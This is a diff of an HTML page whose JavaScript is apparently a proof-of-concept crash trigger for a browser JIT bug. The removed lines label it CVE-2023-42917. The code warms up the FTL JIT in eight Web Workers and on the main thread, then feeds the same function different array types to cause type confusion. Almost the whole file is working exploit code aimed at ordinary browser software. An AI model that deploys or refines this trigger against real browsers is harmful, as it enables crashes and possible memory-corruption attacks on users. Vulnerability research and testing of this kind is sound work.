@@ -1,42 +1,43 @@
 <!DOCTYPE html>
 <html><body>
-<h1 id="status">Running...</h1>
+<h1 id="s">Running...</h1>
 <script>
-// CVE-2023-42917 crash trigger — JIT race via Web Workers
-var workerCode = `
-  function jitMe(o) {
-    return o.x + o.y + o.z;
+var wCode = `
+  // FTL JIT'i ısıt
+  function target(arr, i) {
+    return arr[i] + arr[i+1];
   }
-  // Heat up JIT
-  for (var i = 0; i < 500000; i++) {
-    jitMe({x: i, y: i+1, z: i+2});
+  var a = new Float64Array(1000);
+  for (var i = 0; i < 1000000; i++) {
+    target(a, (i % 998));
   }
-  // Type confusion trigger
-  for (var i = 0; i < 500000; i++) {
-    jitMe({x: 1.1, y: 2.2, z: 3.3});
-    jitMe({x: "a", y: "b", z: "c"});
+  // Tip değiştir — JIT assumption'ı kır
+  for (var i = 0; i < 1000000; i++) {
+    var b = [1,2,3,4,5];
+    target(b, 0);
+    var c = [1.1, 2.2, 3.3, 4.4, 5.5];
+    target(c, 0);
   }
 `;
 
-var blob = new Blob([workerCode], {type:'text/javascript'});
-var url = URL.createObjectURL(blob);
+var blob = new Blob([wCode], {type:'text/javascript'});
+var u = URL.createObjectURL(blob);
 
-// Spawn multiple workers for race pressure
-var workers = [];
-for (var i = 0; i < 4; i++) {
-  workers.push(new Worker(url));
-}
+// 8 worker — maksimum concurrent JIT pressure
+for (var i = 0; i < 8; i++) new Worker(u);
 
-// Main thread aynı anda
-function jitMe(o) { return o.x + o.y + o.z; }
-for (var i = 0; i < 500000; i++) {
-  jitMe({x: i, y: i+1, z: i+2});
-}
-for (var i = 0; i < 200000; i++) {
-  jitMe({x: 1.1, y: 2.2, z: 3.3});
-  jitMe({x: "a", y: "b", z: "c"});
-}
+// Ana thread aynı anda farklı tip pattern
+function target(arr, i) { return arr[i] + arr[i+1]; }
+(function() {
+  for (var i = 0; i < 2000000; i++) {
+    var x = {};
+    x.a = i; x.b = i+1;
+    target([x.a, x.b, 0], 0);
+    target([1.1, 2.2, 3.3], 0);
+    target(new Int32Array(4), 0);
+  }
+})();
 
-document.getElementById('status').textContent = 'Done - no crash';
+document.getElementById('s').textContent = 'Done - no crash';
 </script>
 </body></html>
